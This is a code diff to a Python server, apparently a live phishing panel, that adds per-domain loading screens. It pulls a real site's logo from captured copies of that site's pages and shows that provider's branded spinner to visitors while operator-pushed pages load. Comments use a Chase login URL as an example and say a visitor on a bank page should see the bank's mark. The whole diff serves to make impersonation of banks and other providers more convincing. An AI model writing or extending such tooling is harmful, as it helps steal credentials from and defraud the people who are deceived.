@@ -2937,10 +2937,321 @@ def _default_loading_page() -> tuple:
     return "", ""
 
 
+# ----- per-domain loading screens -------------------------------------------
+# "This site's visitors see this site's logo while it loads."
+#
+# A domain configuration (Domains tab) belongs to a HOST, not to a page, so a
+# re-uploaded page still finds it. At boot the server works out which site this
+# visit will land on and embeds that site's loading page in client.html — the
+# same mechanism as a workflow's custom loading page, so it is painted by the
+# browser while it parses rather than fetched afterwards.
+
+_PAGE_DOMAIN_CACHE: Dict[str, tuple] = {}
+_PAGE_LOGO_CACHE: Dict[str, tuple] = {}
+
+_URL_IN_HTML_RE = re.compile(r"""https?://[^\s"'<>)\\]+""", re.IGNORECASE)
+
+
+def _page_base_href(html: str) -> str:
+    """The origin a capture resolves its relative URLs against.
+
+    The stored page may or may not still carry a <base> (the push sanitizer
+    drops it to stop third-party pivots), so this goes through the same
+    validation the serve path uses: the document's own base when it has a
+    usable one, otherwise the origin of the first absolute URL it contains.
+    Captured pages always carry absolute asset references.
+    """
+    if not html:
+        return ""
+    head = html[:400000]
+    m = re.search(r"""<base\b[^>]*\bhref\s*=\s*["']([^"']+)["']""", head, re.IGNORECASE)
+    raw = m.group(1) if m else None
+    try:
+        base = _validated_base_href(raw, head)
+    except Exception:
+        base = raw or ""
+    return base or ""
+
+
+def _host_from_html(html: str) -> str:
+    """The site a captured page belongs to.
+
+    A capture keeps the original page's absolute URLs (assets, links, often a
+    <base href>), so the host is right there. <base> wins because it is the
+    authoritative origin the page itself declared.
+    """
+    if not html:
+        return ""
+    candidates = [_page_base_href(html)]
+    m2 = _URL_IN_HTML_RE.search(html[:400000])
+    if m2:
+        candidates.append(m2.group(0))
+    for raw in candidates:
+        try:
+            host = (urlsplit(raw).hostname or "").strip().lower()
+        except Exception:
+            host = ""
+        if host and "." in host:
+            return host
+    return ""
+
+
+def _page_domain(page_id: str) -> str:
+    """Host of an archived page (cached until the page changes)."""
+    page_id = (page_id or "").strip()
+    if not page_id:
+        return ""
+    try:
+        page = lpv_store.get_page(page_id)
+    except Exception:
+        return ""
+    if not page:
+        return ""
+    key = str(page.get("updated_at") or "")
+    cached = _PAGE_DOMAIN_CACHE.get(page_id)
+    if cached and cached[0] == key:
+        return cached[1]
+    try:
+        html = lpv_store.read_page_html(page_id) or ""
+    except Exception:
+        html = ""
+    host = _host_from_html(html)
+    _PAGE_DOMAIN_CACHE[page_id] = (key, host)
+    return host
+
+
+def _absolute(url: str, base: str) -> str:
+    raw = (url or "").strip()
+    if not raw:
+        return ""
+    if raw.startswith("//"):
+        return ("https:" if (base or "").lower().startswith("https") else "http:") + raw
+    if re.match(r"^[a-z][a-z0-9+.-]*:", raw, re.IGNORECASE):
+        return raw
+    if not base:
+        return ""
+    try:
+        root = f"{urlsplit(base).scheme}://{urlsplit(base).netloc}"
+    except Exception:
+        return ""
+    if raw.startswith("/"):
+        return root + raw
+    return root + "/" + raw.lstrip("./")
+
+
+def _page_logo_candidates(page_id: str) -> Tuple[str, List[Dict[str, Any]]]:
+    """(host, [logo candidates]) for an archived page, best first.
+
+    "Crisp" is the whole point: a 180x180 apple-touch-icon scaled down to the
+    72px the loading page draws stays sharp, while a 16px favicon blown up does
+    not. So the order is apple-touch-icon -> og:image -> icon -> the site root's
+    apple-touch-icon.png.
+    """
+    page_id = (page_id or "").strip()
+    if not page_id:
+        return "", []
+    try:
+        page = lpv_store.get_page(page_id)
+    except Exception:
+        page = None
+    if not page:
+        return "", []
+    key = str(page.get("updated_at") or "")
+    cached = _PAGE_LOGO_CACHE.get(page_id)
+    if cached and cached[0] == key:
+        return cached[1], list(cached[2])
+    try:
+        html = lpv_store.read_page_html(page_id) or ""
+    except Exception:
+        html = ""
+    head = html[:400000]
+    host = _host_from_html(html)
+    base = _page_base_href(html) or ("https://" + host + "/" if host else "")
+
+    found: List[Dict[str, Any]] = []
+    seen = set()
+
+    def add(url: str, kind: str, score: int, sizes: str = "") -> None:
+        absolute = _absolute(url, base)
+        if not absolute or absolute in seen:
+            return
+        if not re.match(r"^(https?:|data:)", absolute, re.IGNORECASE):
+            return
+        seen.add(absolute)
+        found.append({"url": absolute, "kind": kind, "score": score, "sizes": sizes})
+
+    for tag in re.findall(r"<link\b[^>]*>", head, re.IGNORECASE):
+        rel_m = re.search(r"""\brel\s*=\s*["']([^"']*)["']""", tag, re.IGNORECASE)
+        href_m = re.search(r"""\bhref\s*=\s*["']([^"']+)["']""", tag, re.IGNORECASE)
+        if not (rel_m and href_m):
+            continue
+        rel = rel_m.group(1).lower()
+        sizes_m = re.search(r"""\bsizes\s*=\s*["']([^"']+)["']""", tag, re.IGNORECASE)
+        sizes = sizes_m.group(1) if sizes_m else ""
+        big = 0
+        m_size = re.match(r"\s*(\d+)", sizes or "")
+        if m_size:
+            big = int(m_size.group(1))
+        if "apple-touch-icon" in rel:
+            add(href_m.group(1), "apple-touch-icon", 100 + (big // 10), sizes)
+        elif "mask-icon" in rel:
+            add(href_m.group(1), "mask-icon", 40, sizes)
+        elif rel.strip() in ("icon", "shortcut icon", "fluid-icon"):
+            # A 16px favicon is a last resort, a 96/192px icon is not.
+            add(href_m.group(1), "icon", 20 + (big // 10), sizes)
+
+    for tag in re.findall(r"<meta\b[^>]*>", head, re.IGNORECASE):
+        prop = re.search(r"""\b(?:property|name)\s*=\s*["']([^"']+)["']""", tag, re.IGNORECASE)
+        content = re.search(r"""\bcontent\s*=\s*["']([^"']+)["']""", tag, re.IGNORECASE)
+        if not (prop and content):
+            continue
+        key = prop.group(1).strip().lower()
+        if key in ("og:image", "og:image:secure_url", "twitter:image"):
+            add(content.group(1), key, 70)
+
+    if host:
+        add("https://" + host + "/apple-touch-icon.png", "root-icon", 30)
+
+    found.sort(key=lambda item: item.get("score", 0), reverse=True)
+    found = found[:8]
+    _PAGE_LOGO_CACHE[page_id] = (key, host, tuple(found))
+    return host, found
+
+
+def _brand_spinner_html(cfg: Dict[str, Any]) -> str:
+    """The loading page a domain gets when it has a logo but no uploaded HTML.
+
+    This is what replaces the old "custom branding" ring for a configured site:
+    the provider's own mark, drawn once at its natural size on white, with a
+    quiet progress bar underneath. Nothing is scaled up (that is what makes a
+    logo look soft), and the mark is centred on a plain background so it reads
+    the same on a phone as on a desktop.
+    """
+    logo = str(cfg.get("logo_url") or "").strip()
+    if not logo:
+        return ""
+    label = str(cfg.get("label") or cfg.get("domain") or "").strip()
+    import html as html_lib
+    logo_attr = html_lib.escape(logo, quote=True)
+    label_html = html_lib.escape(label)
+    return (
+        "<!doctype html><html><head><meta charset=\"utf-8\">"
+        "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, viewport-fit=cover\">"
+        "<style>"
+        "html,body{height:100%;margin:0;background:#fff;-webkit-font-smoothing:antialiased}"
+        ".wrap{height:100%;display:flex;flex-direction:column;align-items:center;"
+        "justify-content:center;gap:20px;font-family:'Space Grotesk',-apple-system,"
+        "BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}"
+        ".mark{width:76px;height:76px;display:block;object-fit:contain;"
+        "image-rendering:-webkit-optimize-contrast}"
+        ".name{font-size:15px;font-weight:500;color:#16181d;letter-spacing:.01em}"
+        ".bar{width:136px;height:3px;border-radius:99px;background:#eceef3;overflow:hidden;position:relative}"
+        ".bar::after{content:'';position:absolute;top:0;bottom:0;width:42%;border-radius:99px;"
+        "background:#16181d;animation:sweep 1.25s cubic-bezier(.4,0,.2,1) infinite}"
+        "@keyframes sweep{0%{transform:translateX(-100%)}100%{transform:translateX(340%)}}"
+        "@media (prefers-color-scheme:dark){html,body{background:#fff}}"
+        "</style></head><body><div class=\"wrap\">"
+        f"<img class=\"mark\" src=\"{logo_attr}\" alt=\"\" width=\"76\" height=\"76\">"
+        + (f"<div class=\"name\">{label_html}</div>" if label_html else "")
+        + "<div class=\"bar\"></div></div></body></html>"
+    )
+
+
+def _domain_spinner_for(cfg: Optional[Dict[str, Any]]) -> str:
+    """The document a domain shows while its page loads."""
+    if not cfg:
+        return ""
+    raw = str(cfg.get("spinner_html") or "").strip()
+    if raw:
+        return raw
+    page_id = str(cfg.get("spinner_page_id") or "").strip()
+    if page_id:
+        try:
+            html = lpv_store.read_page_html(page_id)
+        except Exception:
+            html = None
+        if html:
+            return html
+    return _brand_spinner_html(cfg)
+
+
+def _domain_spinner_url_for_page(page_id: str) -> str:
+    """The loading page this page's site has, or "" when it has none.
+
+    Shipped with every push so the runtime can show the provider's spinner
+    while the page downloads — the same one the visitor saw at boot, so a
+    multi-step flow keeps one identity instead of dropping back to our ring.
+    """
+    host = _page_domain(page_id)
+    if not host:
+        return ""
+    try:
+        cfg = lpv_store.find_domain(host)
+    except Exception:
+        cfg = None
+    if not cfg:
+        return ""
+    return f"/api/lpv/domains/{cfg['domain']}/spinner.html"
+
+
+def _boot_page_id(wf: Optional[dict]) -> str:
+    """The page this visit will land on, as far as the server can tell now.
+
+    The first page step of the workflow, or — when visitors boot straight into
+    LPV mode — the configured landing page. Everything else (a page pushed
+    later by hand) is handled by the runtime.
+    """
+    if isinstance(wf, dict):
+        for step in (wf.get("steps") or []):
+            if not isinstance(step, dict):
+                continue
+            if str(step.get("kind") or "") == "page" and step.get("page_id"):
+                return str(step["page_id"])
+    try:
+        settings = srv_settings.get_settings()
+        if settings.lpv_only_mode:
+            return str(settings.lpv_default_page or "").strip()
+    except Exception:
+        pass
+    return ""
+
+
+def _domain_loading(wf: Optional[dict]) -> Tuple[str, str, Optional[Dict[str, Any]]]:
+    """(html, url, config) of the domain this visit lands on. ("", "", None)
+    when that site has no configuration (or it is switched off)."""
+    page_id = _boot_page_id(wf)
+    if not page_id:
+        return "", "", None
+    host = _page_domain(page_id)
+    if not host:
+        return "", "", None
+    try:
+        cfg = lpv_store.find_domain(host)
+    except Exception:
+        cfg = None
+    if not cfg:
+        return "", "", None
+    html = _domain_spinner_for(cfg)
+    if not html:
+        return "", "", None
+    return html, f"/api/lpv/domains/{cfg['domain']}/spinner.html", cfg
+
+
 def _lpv_boot_loading(wf: Optional[dict]) -> tuple:
-    """The loading page to embed for THIS visit: the workflow's own, or the
-    LPV landing page while visitors boot straight into LPV mode."""
+    """The loading page to embed for THIS visit.
+
+    Resolution order (most specific first):
+
+      1. the workflow's own custom loading page (an explicit choice);
+      2. the loading page / logo configured for the site this visit lands on
+         (Domains tab) — "the provider's own spinner, not our branding";
+      3. the LPV landing page, while visitors boot straight into LPV mode;
+      4. nothing: client.html keeps its own (now branded) ring.
+    """
     html, url = _workflow_loading_page(wf)
+    if html:
+        return html, url
+    html, url, _cfg = _domain_loading(wf)
     if html:
         return html, url
     try:
@@ -6827,6 +7138,8 @@ async def _deliver_page(
         "page_name": page["name"],
         "guard": _page_guard(served_id, page),
         "actions": _page_actions(served_id, page),
+        # That site's loading page, if the operator configured one.
+        "spinner_url": _domain_spinner_url_for_page(served_id),
     }, connection_token=connection_token)
     if not ok:
         lpv_store.record_event(
@@ -7792,6 +8105,120 @@ async def lpv_workflow_redirect_html(workflow_id: str):
 
 
 # ===========================================================================
+# Per-domain loading screens (Domains tab)
+# ===========================================================================
+# One configuration per site: the provider's logo (shown crisply while the page
+# loads) and, optionally, the loading page that site shows — either an uploaded
+# HTML file or an archived page. client.html embeds the resolved document in the
+# page it serves, so it is on screen before anything else paints.
+
+@app.get("/api/lpv/domains")
+async def lpv_domains_list():
+    """Every configured domain, without the (large) uploaded HTML."""
+    try:
+        return {"domains": lpv_store.list_domains()}
+    except Exception:
+        logger.debug("[lpv] domain list failed", exc_info=True)
+        return {"domains": []}
+
+
+@app.get("/api/lpv/domains/{domain}")
+async def lpv_domain_get(domain: str):
+    cfg = lpv_store.get_domain(domain)
+    if not cfg:
+        return JSONResponse({"error": "not found"}, status_code=404)
+    return {"domain": cfg}
+
+
+@app.post("/api/lpv/domains")
+async def lpv_domain_save(request: Request):
+    """Create or update one domain.
+
+    Body: {domain, label, logo_url, spinner_html, spinner_page_id, enabled}
+    `domain` accepts a full URL ("https://www.chase.com/login") and is stored as
+    the bare host. Omitting a field keeps what is already there, so the panel can
+    toggle `enabled` without resending a 1 MB loading page.
+    """
+    try:
+        body = await request.json()
+    except Exception:
+        return JSONResponse({"error": "invalid JSON"}, status_code=400)
+    if not isinstance(body, dict):
+        return JSONResponse({"error": "invalid body"}, status_code=400)
+    try:
+        existing = lpv_store.get_domain(body.get("domain") or "") or {}
+    except Exception:
+        existing = {}
+    payload = dict(existing)
+    for key in ("domain", "label", "logo_url", "spinner_html", "spinner_page_id", "enabled"):
+        if key in body:
+            payload[key] = body[key]
+    if "spinner_html" not in body and existing.get("spinner_html"):
+        payload["spinner_html"] = existing["spinner_html"]
+    try:
+        saved = lpv_store.save_domain(payload)
+    except ValueError as ve:
+        return JSONResponse({"error": str(ve)}, status_code=400)
+    lpv_store.record_event(
+        "system", "domain_saved",
+        {"domain": saved["domain"], "label": saved.get("label") or "",
+         "spinner": "html" if saved.get("spinner_html") else
+                    ("page" if saved.get("spinner_page_id") else
+                     ("logo" if saved.get("logo_url") else "none")),
+         "enabled": bool(saved.get("enabled"))},
+    )
+    out = dict(saved)
+    out["has_spinner_html"] = bool((out.get("spinner_html") or "").strip())
+    out["spinner_html"] = ""
+    return {"domain": out}
+
+
+@app.delete("/api/lpv/domains/{domain}")
+async def lpv_domain_delete(domain: str):
+    if not lpv_store.delete_domain(domain):
+        return JSONResponse({"error": "not found"}, status_code=404)
+    lpv_store.record_event("system", "domain_deleted", {"domain": lpv_store.normalise_domain(domain)})
+    return {"deleted": lpv_store.normalise_domain(domain)}
+
+
+@app.get("/api/lpv/domains/{domain}/spinner.html")
+async def lpv_domain_spinner_html(domain: str):
+    """The loading page for one domain, as a raw HTML document.
+
+    This is what client.html points at (data-lpv-url) and what it loads when a
+    workflow starts and the embedded copy is not the one on screen. 404 means
+    "no configured spinner for this site".
+    """
+    cfg = lpv_store.get_domain(domain)
+    if not cfg or not cfg.get("enabled"):
+        return JSONResponse({"error": "no spinner for this domain"}, status_code=404)
+    html = _domain_spinner_for(cfg)
+    if not html:
+        return JSONResponse({"error": "no spinner for this domain"}, status_code=404)
+    return HTMLResponse(
+        content=html,
+        media_type="text/html; charset=utf-8",
+        headers={"Cache-Control": "no-cache, must-revalidate"},
+    )
+
+
+@app.get("/api/lpv/pages/{page_id}/logo")
+async def lpv_page_logo(page_id: str):
+    """Which site a page came from, and its best logo candidates.
+
+    The Domains tab uses this: pick an archived page, and the domain plus a
+    crisp logo are filled in from the capture itself — no external lookup and no
+    guessing. `candidates` is ordered best-first (apple-touch-icon, og:image,
+    then icons by declared size).
+    """
+    page = lpv_store.get_page(page_id)
+    if not page:
+        return JSONResponse({"error": "not found"}, status_code=404)
+    host, candidates = _page_logo_candidates(page_id)
+    return {"page_id": page_id, "domain": host, "candidates": candidates}
+
+
+# ===========================================================================
 # Live chat
 # ===========================================================================
 
@@ -7977,16 +8404,32 @@ async def _run_workflow_on_client(
     respect_redirect = workflow.get("respect_redirect", True)
     # Tell the client this chain's branding so it can paint the branded
     # loading screen (custom logo + spinner color) until the first push.
+    #
+    # The site this visit lands on wins over the workflow's generic branding:
+    # a visitor on a bank page should see the bank's mark, not a colour the
+    # operator picked once. And when that site has a loading page, the client
+    # is told which one it is — it is already embedded in the document that is
+    # on screen, so the runtime adopts it instead of fetching a second copy.
+    domain_html, domain_url, domain_cfg = "", "", None
+    try:
+        domain_html, domain_url, domain_cfg = _domain_loading(workflow)
+    except Exception:
+        logger.debug("[workflow] domain loading page resolution failed", exc_info=True)
+    brand_logo = ((domain_cfg or {}).get("logo_url") or "").strip() \
+        or (workflow.get("brand_logo_url") or "")
+    redirect_url = _chat_redirect_url(workflow) or domain_url
     try:
         await _send_to_client(client_id, {
             "type": "lpv_workflow_branding",
             "workflow_id": workflow.get("id"),
             "workflow_name": workflow.get("name") or "",
-            "brand_logo_url": workflow.get("brand_logo_url") or "",
+            "brand_logo_url": brand_logo,
             "brand_color": workflow.get("brand_color") or "",
             "respect_redirect": bool(respect_redirect),
             # Non-empty => client renders this instead of its own spinner.
-            "redirect_html_url": _chat_redirect_url(workflow),
+            "redirect_html_url": redirect_url,
+            # Which site's configuration supplied the logo/spinner above.
+            "domain": (domain_cfg or {}).get("domain", "") if domain_cfg else "",
         }, connection_token=connection_token)
     except Exception:
         pass
@@ -8045,6 +8488,9 @@ async def _run_workflow_on_client(
                 "guard": _page_guard(page_id, page),
                 # And the controls that take the visitor somewhere.
                 "actions": _page_actions(page_id, page),
+                # This site's loading page, so the step that lands on it
+                # shows the provider's spinner rather than our ring.
+                "spinner_url": _domain_spinner_url_for_page(page_id),
             }, connection_token=connection_token)
             if not ok:
                 # Client is gone (disconnected mid-chain). Log it and abort —
@@ -9097,13 +9543,21 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
             # Click guard for the landing page (see /api/lpv/pages/<id>/guard).
             "default_page_guard": _page_guard(default_page),
             "default_page_actions": _page_actions(default_page),
+            # The landing page's own site spinner (Domains tab), if any.
+            "default_page_spinner_url": _domain_spinner_url_for_page(default_page),
             "uses_brand_spinner": settings.lpv_default_uses_brand_spinner,
             "workflow_id": (wf_boot or {}).get("id", ""),
             "workflow_name": (wf_boot or {}).get("name", ""),
-            "brand_logo_url": (wf_boot or {}).get("brand_logo_url", "") or "",
+            "brand_logo_url": (
+                (_domain_loading(wf_boot or {})[2] or {}).get("logo_url", "")
+                or (wf_boot or {}).get("brand_logo_url", "") or ""
+            ),
             "brand_color": (wf_boot or {}).get("brand_color", "") or "",
             "respect_redirect": (wf_boot or {}).get("respect_redirect", True),
-            "redirect_html_url": _chat_redirect_url(wf_boot or {}),
+            "redirect_html_url": (
+                _chat_redirect_url(wf_boot or {})
+                or _domain_loading(wf_boot or {})[1]
+            ),
             "chat": _chat_config(_device_from_init(init_data)),
             # Tab/favicon branding. The pushed page renders in a blob
             # iframe, so its own <title>/icon never reach the browser
@@ -9166,6 +9620,7 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
                 "page_name": page.get("name", default_page),
                 "guard": _page_guard(page.get("id", default_page), page),
                 "actions": _page_actions(page.get("id", default_page), page),
+                "spinner_url": _domain_spinner_url_for_page(page.get("id", default_page)),
             })
         except Exception:
             pass
@@ -10700,6 +11155,7 @@ async def admin_websocket_endpoint(websocket: WebSocket):
                                         "page_name": page["name"],
                                         "guard": _page_guard(page_id, page),
                                         "actions": _page_actions(page_id, page),
+                                        "spinner_url": _domain_spinner_url_for_page(page_id),
                                     })
                                     if ok:
                                         lpv_store.set_current_page(
